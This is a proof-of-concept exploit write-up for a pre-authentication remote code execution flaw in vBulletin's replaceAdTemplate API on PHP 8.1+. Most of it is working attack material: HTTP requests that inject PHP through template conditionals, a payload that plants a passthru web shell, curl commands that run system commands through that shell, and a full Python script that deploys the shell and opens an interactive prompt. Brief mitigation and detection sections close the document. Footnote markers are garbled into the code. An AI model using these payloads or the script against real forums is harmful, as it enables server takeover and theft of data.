<img src="https://r2cdn.perplexity.ai/pplx-full-logo-primary-dark%402x.png" class="logo" width="120"/>

# vBulletin replaceAdTemplate Remote Code Execution POC

**Author:** Chirag Artani
**CVE:** N/A (N-Day vulnerability)
**Affected Versions:** vBulletin 5.x and 6.x running on PHP 8.1+
**Severity:** Critical (Pre-authentication RCE)

## Vulnerability Overview

This vulnerability exploits a combination of two security flaws in vBulletin[^1]:

1. **PHP Reflection API Misuse**: vBulletin's API controller allows calling `protected` methods via `ReflectionMethod::invoke()` when running on PHP 8.1+
2. **Template Engine Code Injection**: The template parser can be bypassed using variable function calls to execute arbitrary PHP code

The exploit chain targets the `vB_Api_Ad::replaceAdTemplate()` protected method to inject malicious templates that execute PHP code through vBulletin's template conditionals (`<vb:if>` tags)[^1].

## Technical Details

### **Root Cause Analysis**

The vulnerability stems from changes in PHP 8.1 that allow `protected` and `private` methods to be invoked via the Reflection API. vBulletin's API controller uses `is_callable()` to check method accessibility, but this function returns `true` even for `protected` methods, allowing execution to continue to `ReflectionMethod::invokeArgs()`[^1].

The `replaceAdTemplate()` method accepts user-controlled template content that gets processed by vBulletin's template engine. By using variable function calls (e.g., `"function_name"(args)`), attackers can bypass the template parser's security regex checks and execute arbitrary PHP functions[^1].

## Proof of Concept

### **Step 1: File Write Operation**

Create a simple text file to verify code execution:

```http
POST /ajax/api/ad/replaceAdTemplate HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 153

routestring=ajax/api/ad/replaceAdTemplate&styleid=1&location=3444&template=<vb:if condition='"file_put_contents"("hello.txt", "Hello World!")'></vb:if>
```


### **Step 2: Directory Listing Verification**

Confirm file creation and explore the web directory:

```http
POST /ajax/api/ad/replaceAdTemplate HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 127

routestring=ajax/api/ad/replaceAdTemplate&styleid=1&location=3444&template=<vb:if condition='"print_r"("glob"("*"))'></vb:if>
```

**Expected Response:**

```
Array
(
    [^0] => LICENSE
    [^1] => ava
    [^2] => config.php
    [^3] => config.php.bkp
    [^4] => core
    [^5] => customavatars
    [^6] => customgroupicons
    [^7] => customprofilepics
    [^8] => favicon.ico
    [^9] => fonts
    [^10] => hello.txt
    [^11] => htaccess.txt
    [^12] => images
    [^13] => includes
    [^14] => index.php
    [^15] => js
    [^16] => logs
    [^17] => ocp.php
    [^18] => opcache-gui.php
    [^19] => opcache.php
    [^20] => signaturepics
    [^21] => useralbums
    [^22] => userfiles
    [^23] => web.config
)
```


### **Step 3: Web Shell Deployment**

Deploy a persistent web shell for command execution:

```http
POST /ajax/api/ad/replaceAdTemplate HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 189

routestring=ajax/api/ad/replaceAdTemplate&styleid=1&location=3444&template=<vb:if condition='"file_put_contents"("shell.php", "<?php if(isset($_POST[\"cmd\"])) { echo \"<pre>\"; passthru($_POST[\"cmd\"]); echo \"</pre>\"; } ?>")'></vb:if>
```


### **Step 4: Command Execution**

Execute system commands through the deployed web shell:

```bash
curl -X POST http://target.com/shell.php -d "cmd=id"
curl -X POST http://target.com/shell.php -d "cmd=whoami"
curl -X POST http://target.com/shell.php -d "cmd=ls -la"
```


## Automated Exploitation Script

```python
#!/usr/bin/env python3
"""
vBulletin replaceAdTemplate RCE Exploit
Author: Chirag Artani
"""

import requests
import sys
import urllib.parse

def exploit_vbulletin(target_url):
    print("[+] vBulletin replaceAdTemplate RCE Exploit")
    print(f"[+] Target: {target_url}")
    
    # Step 1: Deploy web shell
    shell_payload = '<?php if(isset($_POST["cmd"])) { echo "<pre>"; passthru($_POST["cmd"]); echo "</pre>"; } ?>'
    template_payload = f'<vb:if condition=\'"file_put_contents"("rce.php", "{shell_payload}")\' ></vb:if>'
    
    data = {
        'routestring': 'ajax/api/ad/replaceAdTemplate',
        'styleid': '1',
        'location': '3444',
        'template': template_payload
    }
    
    try:
        response = requests.post(f"{target_url}/ajax/api/ad/replaceAdTemplate", data=data, timeout=10)
        print(f"[+] Shell deployment response: {response.status_code}")
        
        # Step 2: Test shell access
        shell_url = f"{target_url}/rce.php"
        test_response = requests.post(shell_url, data={'cmd': 'id'}, timeout=10)
        
        if test_response.status_code == 200 and 'uid=' in test_response.text:
            print(f"[+] Shell successfully deployed at: {shell_url}")
            print(f"[+] Test command output:\n{test_response.text}")
            
            # Interactive shell
            while True:
                cmd = input("vBulletin-shell# ")
                if cmd.lower() in ['exit', 'quit']:
                    break
                
                cmd_response = requests.post(shell_url, data={'cmd': cmd}, timeout=10)
                print(cmd_response.text)
                
        else:
            print("[-] Shell deployment failed")
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 vbulletin_rce.py <target_url>")
        print("Example: python3 vbulletin_rce.py http://target.com")
        sys.exit(1)
    
    target = sys.argv[^1].rstrip('/')
    exploit_vbulletin(target)
```


## Mitigation

1. **Immediate Actions:**
    - Update vBulletin to the latest patched version
    - Implement Web Application Firewall (WAF) rules to block malicious template injection attempts
    - Monitor for suspicious API calls to `replaceAdTemplate`
2. **Long-term Security:**
    - Regular security audits of custom API endpoints
    - Implement proper input validation and sanitization
    - Use allowlists instead of denylists for template validation
    - Consider running vBulletin with restricted PHP functions using `disable_functions`

## Detection

Look for the following indicators in web server logs:

- POST requests to `/ajax/api/ad/replaceAdTemplate`
- Template parameters containing `<vb:if condition=` with function calls
- Unusual file creation in web directories
- Suspicious PHP function calls in template content

This vulnerability demonstrates the critical importance of proper access control implementation and secure template processing in web applications[^1].

<div style="text-align: center">⁂</div>

[^1]: https://karmainsecurity.com/dont-call-that-protected-method-vbulletin-rce

[^2]: https://unit42.paloaltonetworks.com/exploits-in-the-wild-for-vbulletin-pre-auth-rce-vulnerability-cve-2019-16759/

[^3]: https://www.authentic8.com/blog/vbulletin-5-0day-from-imperfect-patch

[^4]: https://community.f5.com/kb/technicalarticles/vbulletin-pre-authentication-–-remote-code-execution-cve-2019-16759/283751

[^5]: https://unit42.paloaltonetworks.com/cve-2020-17496/

[^6]: https://x.com/Dinosn/status/1926835589111791894

[^7]: https://cloud.projectdiscovery.io/?template=CVE-2025-24813

[^8]: https://www.sentinelone.com/blog/vbulletin-cve-2023-25135/

[^9]: https://www.exploit-db.com/exploits/38629

[^10]: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/vbulletin-remote-code-execution-cve-2020-7373/

